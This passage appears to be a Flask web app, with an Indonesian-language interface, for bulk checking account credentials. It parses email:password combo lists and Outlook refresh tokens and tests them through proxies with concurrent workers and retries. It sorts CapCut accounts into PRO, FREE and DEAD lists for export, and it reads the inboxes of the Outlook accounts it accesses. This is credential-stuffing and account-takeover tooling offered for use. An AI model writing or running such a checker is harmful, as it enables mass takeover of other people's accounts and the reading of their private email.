          <button type="button" class="btn btn-gold" onclick="submitNewOutlookAccounts()">
            <i class="fa-solid fa-check me-1"></i> Import & Check
          </button>
        </div>
      </div>
    </div>
  </div>

  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
  <script>
    function switchTab(tabName) {
      document.querySelectorAll('.nav-tabs-custom .nav-link').forEach(btn => btn.classList.remove('active'));
      document.querySelectorAll('.tab-pane-custom').forEach(pane => pane.classList.remove('active'));

      if (tabName === 'mail') {
        const btn = document.getElementById('btn-tab-mail');
        if (btn) btn.classList.add('active');
        const pane = document.getElementById('tab-mail');
        if (pane) pane.classList.add('active');
      } else {
        const btn = document.getElementById('btn-tab-capcut');
        if (btn) btn.classList.add('active');
        const pane = document.getElementById('tab-capcut');
        if (pane) pane.classList.add('active');
      }
    }

    function copyField(elementId) {
      const el = document.getElementById(elementId);
      if (!el.value.trim()) return;
      navigator.clipboard.writeText(el.value).then(() => alert('Disalin ke clipboard!'));
    }

    function downloadField(elementId, filename) {
      const content = document.getElementById(elementId).value;
      if (!content.trim()) return alert('Field masih kosong.');
      const blob = new Blob([content], { type: 'text/plain;charset=utf-8;' });
      const link = document.createElement('a');
      link.href = URL.createObjectURL(blob);
      link.download = filename;
      link.click();
    }

    async function safeFetchJson(url, options = {}) {
      const res = await fetch(url, options);
      const text = await res.text();
      try {
        return JSON.parse(text);
      } catch (e) {
        throw new Error(`Respon server tidak valid (${res.status}): ` + (text.slice(0, 120).replace(/<[^>]+>/g, '').trim() || 'Error internal server'));
      }
    }

    function parseOutlookLinesJS(rawText) {
      const emailRegex = /[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}/;
      const clientIdRegex = /^[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}$/;
      const defaultClientId = "9e5f94bc-e8a4-4e73-b8be-63364c29d753";
      
      const lines = rawText.split('\n');
      const results = [];
      const seen = new Set();

      for (let line of lines) {
        line = line.trim();
        if (!line || line.startsWith('#')) continue;

        const parts = line.split(/[|:;\t]+/).map(p => p.trim()).filter(p => p);
        if (!parts.length) continue;

        let email = '';
        let password = '';
        let token = '';
        let clientId = defaultClientId;

        const emailMatch = line.match(emailRegex);
        if (emailMatch) email = emailMatch[0].trim();

        for (const p of parts) {
          if (clientIdRegex.test(p)) {
            clientId = p;
            break;
          }
        }

        for (const p of parts) {
          if (p.startsWith('M.') || (p.length > 50 && p !== email && p !== clientId)) {
            token = p;
            break;
          }
        }

        if (!token) {
          if (parts.length >= 3 && parts[0] === email) {
            token = parts.length >= 4 ? parts[2] : parts[1];
            password = parts.length >= 4 ? parts[1] : '';
          } else if (parts.length === 1 && (parts[0].startsWith('M.') || parts[0].length > 40)) {
            token = parts[0];
          }
        }

        if (!token) continue;

        if (!password && parts.length >= 2 && parts[0] === email && parts[1] !== token) {
          password = parts[1];
        }

        const key = (email || token.slice(0, 30)) + '_' + token.slice(-20);
        if (!seen.has(key)) {
          seen.add(key);
          results.push({
            email: email || 'Unknown',
            password: password,
            refresh_token: token,
            client_id: clientId
          });
        }
      }
      return results;
    }

    function parseCapcutLinesJS(rawText) {
      const lines = rawText.split('\n');
      const accounts = [];
      const seen = new Set();

      for (let line of lines) {
        line = line.trim();
        if (!line || line.startsWith('#')) continue;

        let email = '', password = '';
        const emailMatch = line.match(/[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}/);
        
        if (line.includes('----')) {
          const parts = line.split('----');
          email = parts[0].trim();
          password = parts[1] ? parts[1].trim() : '';
        } else if (line.includes(':')) {
          const parts = line.split(':');
          email = parts[0].trim();
          password = parts.slice(1).join(':').trim();
        } else if (line.includes('|')) {
          const parts = line.split('|');
          email = parts[0].trim();
          password = parts.slice(1).join('|').trim();
        } else if (line.includes('\t')) {
          const parts = line.split('\t');
          email = parts[0].trim();
          password = parts[1] ? parts[1].trim() : '';
        } else if (emailMatch) {
          email = emailMatch[0].trim();
          const rest = line.replace(email, '').trim().replace(/^[:|\s-]+/, '');
          password = rest;
        }

        if (email) {
          const key = (email + ':' + password).toLowerCase();
          if (!seen.has(key)) {
            seen.add(key);
            accounts.push({ email, password });
          }
        }
      }
      return accounts;
    }

    let outlookAccounts = [];
    let selectedAccountIndex = -1;

    function renderAccountsList() {
      const container = document.getElementById('tmAccountsContainer');
      document.getElementById('tmAccountCount').textContent = outlookAccounts.length;

      if (outlookAccounts.length === 0) {
        container.innerHTML = `<div class="text-center text-muted py-5 small">Belum ada akun.<br>Klik <b>+ Add Account</b> di bawah.</div>`;
        return;
      }

      let html = '';
      outlookAccounts.forEach((acc, idx) => {
        const initial = (acc.email || 'U')[0].toUpperCase();
        const dotClass = acc.ok ? 'live' : 'dead';
        const activeClass = idx === selectedAccountIndex ? 'active' : '';

        html += `
          <div class="tm-account-item ${activeClass}" onclick="selectOutlookAccount(${idx})">
            <div class="tm-avatar">${initial}</div>
            <div class="flex-grow-1 overflow-hidden">
              <div class="d-flex align-items-center gap-2">
                <span class="status-dot ${dotClass}"></span>
                <span class="small fw-semibold text-truncate text-light">${acc.email}</span>
              </div>
              <small class="text-muted d-block text-truncate" style="font-size: 0.72rem;">${acc.ok ? (acc.latest_subject || 'Live') : (acc.error || 'Dead')}</small>
            </div>
          </div>
        `;
      });
      container.innerHTML = html;
    }

    async function submitNewOutlookAccounts() {
      const inputEl = document.getElementById('modalAccountInput');
      const proxyEl = document.getElementById('modalProxyInput');
      const text = inputEl ? inputEl.value.trim() : '';
      const proxy = proxyEl ? proxyEl.value.trim() : '';
      if (!text) return alert('Silakan masukkan token / akun!');

      // Force close modal
      try {
        const modalEl = document.getElementById('addAccountModal');
        if (modalEl) {
          const closeBtn = modalEl.querySelector('[data-bs-dismiss="modal"]');
          if (closeBtn) closeBtn.click();
          if (window.bootstrap && bootstrap.Modal) {
            const inst = bootstrap.Modal.getInstance(modalEl);
            if (inst) inst.hide();
          }
          modalEl.classList.remove('show');
          modalEl.style.display = 'none';
          document.querySelectorAll('.modal-backdrop').forEach(b => b.remove());
          document.body.classList.remove('modal-open');
          document.body.style.removeProperty('padding-right');
          document.body.style.removeProperty('overflow');
        }
      } catch(e) {
        console.error('Modal close error:', e);
      }

      const container = document.getElementById('tmAccountsContainer');
      container.innerHTML = `<div class="text-center text-muted py-5 small"><i class="fa-solid fa-spinner fa-spin me-2 text-warning"></i>Memeriksa akun...</div>`;

      try {
        let items = parseOutlookLinesJS(text);
        if (!items || items.length === 0) {
          try {
            items = await safeFetchJson('/api/parse_accounts', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({ text: text, mode: 'outlook' })
            });
          } catch(e) {
            console.error('API parse error:', e);
          }
        }
        if (!items || items.length === 0) {
          renderAccountsList();
          return alert('Format tidak dikenali / token tidak ditemukan! Pastikan ada email dan refresh token.');
        }

        let currentIndex = 0;
        async function worker() {
          while (currentIndex < items.length) {
            const idx = currentIndex++;
            const item = items[idx];
            try {
              const data = await safeFetchJson('/api/check_single_outlook', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                  email: item.email,
                  password: item.password,
                  refresh_token: item.refresh_token,
                  client_id: item.client_id,
                  proxy: proxy
                })
              });
              outlookAccounts.push(data);
              renderAccountsList();
              if (selectedAccountIndex === -1) {
                selectOutlookAccount(0);
              }
            } catch (e) {
              outlookAccounts.push({
                ok: false,
                email: item.email || 'Error',
                error: e.message,
                refresh_token: item.refresh_token,
                client_id: item.client_id
              });
              renderAccountsList();
              if (selectedAccountIndex === -1) {
                selectOutlookAccount(0);
              }
            }
          }
        }

        const pool = [];
        for (let i = 0; i < Math.min(8, items.length); i++) {
          pool.push(worker());
        }
        await Promise.all(pool);

      } catch (err) {
        alert('Gagal memproses akun: ' + err.message);
        renderAccountsList();
      }
    }

    function clearAllOutlookAccounts() {
      if (confirm('Hapus semua daftar akun Mail Checker?')) {
        outlookAccounts = [];
        selectedAccountIndex = -1;
        renderAccountsList();
        document.getElementById('tmMessagesContainer').innerHTML = `<div class="text-center text-muted py-5 small">Pilih akun di sebelah kiri untuk melihat pesan inbox.</div>`;
        document.getElementById('tmReaderContent').innerHTML = `<div class="text-center text-muted my-auto"><i class="fa-regular fa-envelope-open fa-3x mb-3 text-warning"></i><h5 class="text-light">Belum ada email yang dipilih</h5></div>`;
      }
    }

    async function selectOutlookAccount(idx) {
      selectedAccountIndex = idx;
      renderAccountsList();
      const acc = outlookAccounts[idx];
      if (!acc) return;
      document.getElementById('tmActiveEmailLabel').textContent = acc.email;

      const badge = document.getElementById('tmConnectionBadge');
      if (acc.ok) {
        badge.className = 'badge bg-success text-light px-2 py-1';
        badge.innerHTML = '● Connected';
        await loadInboxMessages(acc);
      } else {
        badge.className = 'badge bg-danger text-light px-2 py-1';
        badge.innerHTML = '● Disconnected';
        document.getElementById('tmMessagesContainer').innerHTML = `<div class="text-center py-5 small text-danger"><i class="fa-solid fa-circle-exclamation fa-2x mb-2 text-danger"></i><br>Tidak dapat memuat inbox.<br><small class="text-secondary">${acc.error || 'Akun DEAD / Token tidak valid'}</small></div>`;
        document.getElementById('tmReaderContent').innerHTML = `
          <div class="text-center text-muted my-auto">
            <i class="fa-solid fa-triangle-exclamation fa-3x mb-3 text-danger"></i>
            <h5 class="text-danger">Akun Disconnected / DEAD</h5>
            <p class="small text-secondary px-3">${acc.error || 'Token tidak valid, kedaluwarsa, atau rusak.'}</p>
          </div>
        `;
      }
    }

    async function loadInboxMessages(acc) {
      const container = document.getElementById('tmMessagesContainer');
      container.innerHTML = `<div class="text-center text-muted py-5 small"><i class="fa-solid fa-spinner fa-spin me-2 text-warning"></i>Memuat pesan inbox...</div>`;

      try {
        const data = await safeFetchJson('/api/mail/inbox', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ refresh_token: acc.refresh_token, client_id: acc.client_id })
        });

        if (!data.ok) {
          container.innerHTML = `<div class="text-center text-danger py-5 small">${data.error || 'Gagal memuat pesan'}</div>`;
          return;
        }

        document.getElementById('tmInboxTitle').innerHTML = `<i class="fa-regular fa-folder-open me-1"></i> INBOX (${data.messages.length})`;

        if (data.messages.length === 0) {
          container.innerHTML = `<div class="text-center text-muted py-5 small">Inbox kosong.</div>`;
          return;
        }

        let html = '';
        data.messages.forEach((msg, mIdx) => {
          html += `
            <div class="tm-message-item" id="msg-${msg.id}" onclick="readMessage('${msg.id}')">
              <div class="d-flex justify-content-between align-items-center mb-1">
                <span class="fw-bold small text-truncate text-light">${msg.sender_name}</span>
                <small class="text-warning" style="font-size: 0.72rem;">${msg.time_display}</small>
              </div>
              <div class="fw-semibold text-truncate small text-light mb-1">
                ${!msg.is_read ? '<span class="tm-unread-dot"></span>' : ''}"${msg.subject}"
              </div>
              <div class="text-muted text-truncate" style="font-size: 0.75rem;">
                ${msg.preview || 'Tidak ada preview'}
              </div>
            </div>
          `;
        });
        container.innerHTML = html;

        if (data.messages.length > 0) {
          readMessage(data.messages[0].id);
        }

      } catch (err) {
        container.innerHTML = `<div class="text-center text-danger py-5 small">${err.message}</div>`;
      }
    }

    async function readMessage(msgId) {
      if (selectedAccountIndex < 0) return;
      const acc = outlookAccounts[selectedAccountIndex];

      document.querySelectorAll('.tm-message-item').forEach(el => el.classList.remove('active'));
      const activeEl = document.getElementById('msg-' + msgId);
      if (activeEl) activeEl.classList.add('active');

      const reader = document.getElementById('tmReaderContent');
      reader.innerHTML = `<div class="text-center text-muted my-auto"><i class="fa-solid fa-spinner fa-spin fa-2x mb-2 text-warning"></i><p class="small">Memuat isi surat...</p></div>`;

      try {
        const data = await safeFetchJson('/api/mail/message', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ message_id: msgId, refresh_token: acc.refresh_token, client_id: acc.client_id })
        });

        if (!data.ok) {
          reader.innerHTML = `<div class="text-center text-danger my-auto">${data.error || 'Gagal membaca email'}</div>`;
          return;
        }

        reader.innerHTML = `
          <h4 class="fw-bold text-warning mb-2">"${data.subject}"</h4>
          
          <div class="tm-meta-card">
            <div class="row g-2 small">
              <div class="col-sm-2 text-warning fw-bold">FROM</div>
              <div class="col-sm-10 text-light">${data.from}</div>
              <div class="col-sm-2 text-warning fw-bold">TO</div>
              <div class="col-sm-10 text-light">${data.to || acc.email}</div>
              <div class="col-sm-2 text-warning fw-bold">DATE</div>
              <div class="col-sm-10 text-light">${data.date}</div>
            </div>
          </div>

          <div class="flex-grow-1 d-flex">
            <iframe class="tm-email-iframe shadow" srcdoc="${escapeHtml(data.body)}"></iframe>
          </div>
        `;
      } catch (err) {
        reader.innerHTML = `<div class="text-center text-danger my-auto">${err.message}</div>`;
      }
    }

    function escapeHtml(str) {
      return (str || '').replace(/"/g, '&quot;');
    }

    function refreshCurrentInbox() {
      if (selectedAccountIndex >= 0) {
        loadInboxMessages(outlookAccounts[selectedAccountIndex]);
      }
    }

    function copyCurrentEmail() {
      if (selectedAccountIndex >= 0) {
        const email = outlookAccounts[selectedAccountIndex].email;
        if (email) {
          navigator.clipboard.writeText(email).then(() => alert('Email disalin: ' + email));
        }
      }
    }

    let capcutRecords = [];
    let capcutAbortController = null;

    const ccAccountsInput = document.getElementById('ccAccountsInput');
    const ccLineCount = document.getElementById('ccLineCount');

    if (ccAccountsInput) {
      ccAccountsInput.addEventListener('input', () => {
        const lines = ccAccountsInput.value.split('\\n').filter(l => l.trim().length > 0);
        if (ccLineCount) ccLineCount.textContent = lines.length + ' Baris';
      });
    }

    function clearCapcutInput() {
      ccAccountsInput.value = '';
      if (ccLineCount) ccLineCount.textContent = '0 Baris';
    }

    function clearCapcutResults() {
      document.getElementById('proResult').value = '';
      document.getElementById('freeResult').value = '';
      document.getElementById('dieResult').value = '';
      document.getElementById('proCount').textContent = '0';
      document.getElementById('freeCount').textContent = '0';
      document.getElementById('dieCount').textContent = '0';
      document.getElementById('ccProgressText').textContent = '0 / 0 (0%)';
      document.getElementById('ccProgressBar').style.width = '0%';
      capcutRecords = [];
    }

    function exportCapcutResults(type) {
      let content = '', filename = '', mimeType = '';

      if (type === 'json') {
        content = JSON.stringify(capcutRecords, null, 2);
        filename = 'capcut_results.json';
        mimeType = 'application/json;charset=utf-8;';
      } else if (type === 'csv') {
        const headers = ['Email', 'Password', 'Status', 'User ID', 'Plan', 'Expiry', 'Error'];
        const rows = capcutRecords.map(r => [
          r.email,
          r.password,
          r.status,
          r.user_id || '',
          r.is_pro ? 'PRO' : (r.ok ? 'FREE' : 'DEAD'),
          r.expiry || '',
          r.error || ''
        ].map(val => `"${(val || '').toString().replace(/"/g, '""')}"`).join(','));
        content = [headers.join(','), ...rows].join('\\r\\n');
        filename = 'capcut_results.csv';
        mimeType = 'text/csv;charset=utf-8;';
      } else {
        const pro = document.getElementById('proResult').value.trim();
        const free = document.getElementById('freeResult').value.trim();
        const die = document.getElementById('dieResult').value.trim();
        content = `=== PRO ACCOUNTS ===\\n${pro}\\n\\n=== FREE ACCOUNTS ===\\n${free}\\n\\n=== DEAD ACCOUNTS ===\\n${die}\\n`;
        filename = 'capcut_results.txt';
        mimeType = 'text/plain;charset=utf-8;';
      }

      const blob = new Blob([content], { type: mimeType });
      const link = document.createElement('a');
      link.href = URL.createObjectURL(blob);
      link.download = filename;
      link.click();
    }

    function downloadCapcutAll(format) {
      return exportCapcutResults(format);
    }

    async function startCapcutChecking() {
      const text = ccAccountsInput.value.trim();
      const proxy = document.getElementById('ccProxyInput').value.trim();
      const workers = parseInt(document.getElementById('ccWorkersInput').value) || 6;
      const retries = parseInt(document.getElementById('ccRetriesInput').value) || 6;

      if (!text) return alert('Silakan masukkan daftar akun CapCut!');

      document.getElementById('proResult').value = '';
      document.getElementById('freeResult').value = '';
      document.getElementById('dieResult').value = '';
      document.getElementById('proCount').textContent = '0';
      document.getElementById('freeCount').textContent = '0';
      document.getElementById('dieCount').textContent = '0';
      capcutRecords = [];

      let countPro = 0, countFree = 0, countDie = 0, checked = 0;
      document.getElementById('btnStartCapcut').disabled = true;
      document.getElementById('btnStopCapcut').disabled = false;
      capcutAbortController = new AbortController();

      try {
        let accounts = parseCapcutLinesJS(text);
        if (accounts.length === 0) {
          try {
            accounts = await safeFetchJson('/api/parse_accounts', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({ text: text, mode: 'capcut' })
            });
          } catch(e) {}
        }
        const total = accounts ? accounts.length : 0;

        if (total === 0) {
          alert('Tidak ada akun valid yang ditemukan!');
          document.getElementById('btnStartCapcut').disabled = false;
          document.getElementById('btnStopCapcut').disabled = true;
          return;
        }

        document.getElementById('ccProgressText').textContent = `0 / ${total} (0%)`;
        document.getElementById('ccProgressBar').style.width = '0%';

        let currentIndex = 0;
        async function worker() {
          while (currentIndex < total) {
            if (capcutAbortController.signal.aborted) break;
            const idx = currentIndex++;
            const acc = accounts[idx];

            try {
              const r = await safeFetchJson('/api/check_single_capcut', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ email: acc.email, password: acc.password, proxy: proxy, retries: retries }),
                signal: capcutAbortController.signal
              });
              checked++;
              capcutRecords.push(r);
              const uidStr = r.user_id ? ` | UID: ${r.user_id}` : '';

              if (r.ok && r.is_pro) {
                countPro++;
                document.getElementById('proCount').textContent = countPro;
                const exp = r.expiry ? ` | Exp: ${r.expiry}` : '';
                document.getElementById('proResult').value += `${r.email}:${r.password}${uidStr}${exp}\\n`;
              } else if (r.ok && !r.is_pro) {
                countFree++;
                document.getElementById('freeCount').textContent = countFree;
                document.getElementById('freeResult').value += `${r.email}:${r.password}${uidStr} | Free Plan\\n`;
              } else {
                countDie++;
                document.getElementById('dieCount').textContent = countDie;
                const err = r.error ? ` [${r.error}]` : '';
                document.getElementById('dieResult').value += `${r.email}:${r.password}${err}\\n`;
              }

              const percent = Math.round((checked / total) * 100);
              document.getElementById('ccProgressText').textContent = `${checked} / ${total} (${percent}%)`;
              document.getElementById('ccProgressBar').style.width = `${percent}%`;
            } catch (e) {
              if (e.name === 'AbortError') break;
              checked++;
              countDie++;
              document.getElementById('dieCount').textContent = countDie;
              document.getElementById('dieResult').value += `${acc.email}:${acc.password} [${e.message}]\\n`;
              const percent = Math.round((checked / total) * 100);
              document.getElementById('ccProgressText').textContent = `${checked} / ${total} (${percent}%)`;
              document.getElementById('ccProgressBar').style.width = `${percent}%`;
            }
          }
        }

        const pool = [];
        for (let i = 0; i < Math.min(workers, total); i++) {
          pool.push(worker());
        }
        await Promise.all(pool);

      } catch (err) {
        if (err.name !== 'AbortError') alert('Error: ' + err.message);
      } finally {
        document.getElementById('btnStartCapcut').disabled = false;
        document.getElementById('btnStopCapcut').disabled = true;
      }
    }

    function stopCapcutChecking() {
      if (capcutAbortController) capcutAbortController.abort();
      document.getElementById('btnStartCapcut').disabled = false;
      document.getElementById('btnStopCapcut').disabled = true;
    }
  </script>
</body>
</html>
"""

# ==================== FLASK ROUTES ====================

@app.route("/")
@app.route("/api/index.py")
@app.route("/api/index")
@app.route("/api")
def index():
    default_proxy = os.environ.get("CAPCUT_PROXY", "")
    return render_template_string(HTML_TEMPLATE, default_proxy=default_proxy)

@app.route("/logo.png")
def serve_logo():
    base_dir = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
    logo_path = os.path.join(base_dir, "logo.png")
    if os.path.exists(logo_path):
        return send_from_directory(base_dir, "logo.png")
    return ("", 204)

@app.route("/api/check", methods=["POST"])
def api_check_capcut():
    payload = request.get_json(force=True)
    accounts_text = payload.get("accounts_text", "")
    proxy_url = payload.get("proxy", "").strip() or os.environ.get("CAPCUT_PROXY", "")
    workers = int(payload.get("workers", 6))
    retries = int(payload.get("retries", 6))

    accounts = parse_capcut_accounts(accounts_text)
    total = len(accounts)

    def generate():
        yield json.dumps({"type": "init", "total": total}) + "\n"
        if total == 0:
            return

        def _do_check(item):
            email, pw = item
            res = check_capcut_account(
                email, pw, proxy_template=proxy_url, max_ip_retries=retries
            )
            res["password"] = pw
            res["status"] = "PRO" if (res.get("ok") and res.get("is_pro")) else ("FREE" if res.get("ok") else "DEAD")
            return res

        with ThreadPoolExecutor(max_workers=max(1, min(workers, 30))) as pool:
            futures = [pool.submit(_do_check, acc) for acc in accounts]
            for fut in as_completed(futures):
                try:
                    result = fut.result()
                except Exception as e:
                    result = {"ok": False, "email": "unknown", "password": "", "status": "DEAD", "error": str(e)}
                yield json.dumps({"type": "result", "total": total, "data": result}) + "\n"

    return Response(generate(), mimetype="application/x-ndjson")

@app.route("/api/check_outlook", methods=["POST"])
def api_check_outlook():
    payload = request.get_json(force=True)
    accounts_text = payload.get("accounts_text", "")
    proxy_url = payload.get("proxy", "").strip() or None
    workers = int(payload.get("workers", 8))

    items = parse_outlook_lines(accounts_text)
    total = len(items)

    def generate():
        yield json.dumps({"type": "init", "total": total}) + "\n"
        if total == 0:
            return

        def _do_check_outlook(item):
            res = check_outlook_account(
                email=item["email"],
                password=item["password"],
                refresh_token=item["refresh_token"],
                client_id=item["client_id"],
                proxy=proxy_url
            )
            return res

        with ThreadPoolExecutor(max_workers=max(1, min(workers, 30))) as pool:
            futures = [pool.submit(_do_check_outlook, it) for it in items]
            for fut in as_completed(futures):
                try:
                    result = fut.result()
                except Exception as e:
                    result = {"ok": False, "email": "unknown", "password": "", "status": "DEAD", "error": str(e), "refresh_token": "", "client_id": ""}
                yield json.dumps({"type": "result", "total": total, "data": result}) + "\n"

    return Response(generate(), mimetype="application/x-ndjson")

@app.route("/check_single_capcut", methods=["POST"])
@app.route("/api/check_single_capcut", methods=["POST"])
def api_check_single_capcut():
    payload = request.get_json(force=True)
    email = payload.get("email", "").strip()
    pw = payload.get("password", "").strip()
    proxy_url = payload.get("proxy", "").strip() or os.environ.get("CAPCUT_PROXY", "")
    retries = int(payload.get("retries", 6))

    res = check_capcut_account(email, pw, proxy_template=proxy_url, max_ip_retries=retries)
    res["password"] = pw
    res["status"] = "PRO" if (res.get("ok") and res.get("is_pro")) else ("FREE" if res.get("ok") else "DEAD")
    return jsonify(res)

@app.route("/parse_accounts", methods=["POST"])
@app.route("/api/parse_accounts", methods=["POST"])
def api_parse_accounts():
    payload = request.get_json(force=True)
    text = payload.get("text", "")
    mode = payload.get("mode", "capcut")

    if mode == "capcut":
        accounts = parse_capcut_accounts(text)
        return jsonify([{"email": a[0], "password": a[1]} for a in accounts])
    else:
        items = parse_outlook_lines(text)
        return jsonify(items)

@app.route("/check_single_outlook", methods=["POST"])
@app.route("/api/check_single_outlook", methods=["POST"])
def api_check_single_outlook():
    payload = request.get_json(force=True)
    email = payload.get("email", "")
    password = payload.get("password", "")
    refresh_token = payload.get("refresh_token", "")
    client_id = payload.get("client_id", DEFAULT_CLIENT_ID)
    proxy_url = payload.get("proxy", "").strip() or None

    res = check_outlook_account(
        email=email,
        password=password,
        refresh_token=refresh_token,
        client_id=client_id,
        proxy=proxy_url
    )
    return jsonify(res)

@app.route("/mail/inbox", methods=["POST"])
@app.route("/api/mail/inbox", methods=["POST"])
def api_mail_inbox():
    payload = request.get_json(force=True)
    refresh_token = payload.get("refresh_token", "")
    client_id = payload.get("client_id", DEFAULT_CLIENT_ID)
    proxy = payload.get("proxy") or None

    data = fetch_inbox_messages(refresh_token=refresh_token, client_id=client_id, proxy=proxy, top=40)
    return jsonify(data)

@app.route("/mail/message", methods=["POST"])
@app.route("/api/mail/message", methods=["POST"])
def api_mail_message():
    payload = request.get_json(force=True)
    message_id = payload.get("message_id", "")
    refresh_token = payload.get("refresh_token", "")
    client_id = payload.get("client_id", DEFAULT_CLIENT_ID)
    proxy = payload.get("proxy") or None

    data = fetch_message_detail(message_id=message_id, refresh_token=refresh_token, client_id=client_id, proxy=proxy)
    return jsonify(data)

@app.after_request
def add_no_cache_headers(response):
    response.headers["Cache-Control"] = "no-cache, no-store, must-revalidate"
    response.headers["Pragma"] = "no-cache"
    response.headers["Expires"] = "0"
    return response

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    print(f"Starting Multi-Checker Web on http://0.0.0.0:{port} ...")
    app.run(host="0.0.0.0", port=port, debug=False)
